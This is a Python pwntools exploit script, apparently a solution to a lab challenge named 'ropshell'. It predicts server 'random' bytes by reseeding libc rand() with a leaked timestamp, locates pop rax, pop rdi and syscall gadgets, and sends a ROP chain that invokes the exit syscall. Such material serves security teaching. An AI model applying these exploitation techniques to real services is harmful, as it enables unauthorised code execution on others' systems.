#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import numpy as np
import struct
import ctypes
libc = ctypes.CDLL('libc.so.6')

LEN_CODE = int('0x10000', 16)*10

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell_new", shell=False)
    # pw.pause()
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)


if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

r.recvuntil(b'Timestamp is ')
t = r.recvline().strip()
print("Timestamp is :",t)



libc.srand(int(t))#1683735121

list = []
mask = 2 ** 32 - 1
for i in range(LEN_CODE//4) :
    list.append(hex((libc.rand() << 16  & mask) | (libc.rand() & 0xffff)))
k = libc.rand() % (LEN_CODE//4 - 1)
list[k] = hex(12780815)
print(list)

r.recvuntil(b'Random bytes generated at ')
code_p = r.recvline().strip()
print("code atart at : ", code_p)
print("=========================")


for i in range(len(list)):
    if str(list[i]).find("0x58c3") == 0:  #"pop rax;ret"
        addr1 = int(code_p, 16)+i*4
        print(f"find  pop rax;ret : {list[i]}, addr at {hex(addr1)}")
        break
for i in range(len(list)):
    if str(list[i]).find("0x5fc3") == 0:  #"pop rdi;ret"
        addr2 = int(code_p, 16)+i*4
        print(f"find  pop rdi;ret : {list[i]}, addr at {hex(addr2)}")
        break

addr3 = int(code_p, 16)+k*4
print(f"syscall;ret : {list[k]}, addr at {hex(addr3)}")

# address low->high
buf = b''.join([p64(addr1), p64(60), p64(addr2), p64(0), p64(addr3)])
print("send to server = ", buf)
r.send(buf)

r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :